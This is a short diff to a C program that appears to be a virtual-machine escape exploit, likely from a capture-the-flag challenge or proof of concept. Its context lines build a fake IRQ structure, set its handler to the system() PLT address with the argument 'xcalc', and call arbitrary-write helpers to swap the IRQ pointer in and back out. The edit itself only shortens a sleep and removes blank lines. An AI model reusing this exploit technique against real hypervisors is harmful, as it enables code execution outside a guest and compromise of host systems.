@@ -317,9 +317,7 @@ int main()
     printf("irq_addr: 0x%llx\n", irq_addr);
     printf("fake_irq_addr: 0x%llx\n", fake_irq_addr);
     printf("irq_ptr: 0x%llx\n", irq_ptr);
-    
-    sleep(10);
-
+    sleep(3);
     // construct fake_irq
     setup_state_data();
     *(unsigned long *)(data_buf + 0x28) = system_plt; // handler
@@ -327,14 +325,10 @@ int main()
     *(unsigned long *)(data_buf + 0x38) = 0x3; //n
     *(unsigned long *)(data_buf + 0x100) = 0x636c616378; // "xcalc"
     do_copy_write(0, 0xffff, 0xffff);
-
     // write fake_irq
     arb_write(irq_addr, fake_irq_addr);
-
     // write back  irq_ptr
     arb_write(irq_addr, irq_ptr);
-    
-
     //printf("success233!\n");
 
 };
